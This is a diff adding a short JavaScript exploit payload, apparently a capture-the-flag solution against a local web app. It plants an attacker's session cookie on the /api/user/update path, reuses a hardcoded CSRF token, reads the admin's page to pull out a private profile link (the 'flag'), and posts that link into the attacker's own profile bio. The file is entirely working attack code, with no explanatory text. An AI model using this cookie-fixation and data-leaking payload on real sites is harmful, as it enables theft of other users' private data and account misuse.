@@ -1,0 +1,26 @@
+// Set our account cookie for /api/user/update
+document.cookie = "session=eyJjc3JmX3Rva2VuIjoiMGIxMzYwMjc5YWFlYTAyOTU2OTNlNmE1MDE1Y2QyN2Q0Y2EwOWJiOCIsInVzZXIiOiIxMjM0NTY3OCJ9.Yxhk-Q.e1-HkpckpFGB07p-qbZvZ5tBW5k; path=/api/user/update"
+
+// Set csrf_token to our csrf_token
+let csrf = "IjBiMTM2MDI3OWFhZWEwMjk1NjkzZTZhNTAxNWNkMjdkNGNhMDliYjgi.Yxhqhg.fpyT9r_MmHtm_4ZL-iZzgShCDoc";
+
+// init xhr
+xhr = new XMLHttpRequest();
+
+
+// Get admin's profile link
+let url;
+xhr.open("GET", "/", false);
+xhr.onload = function () {
+    url = /"http:\/\/localhost:8003\/profile\/.*"/.exec(xhr.response);
+    console.log(url[0]);
+};
+xhr.send(null);
+
+
+// Post flag to our profile
+xhr.open("POST", "/api/user/update", false);
+xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')
+data = `bio=${url[0]}&csrf_token=${csrf}`;
+console.log(data);
+xhr.send(data);
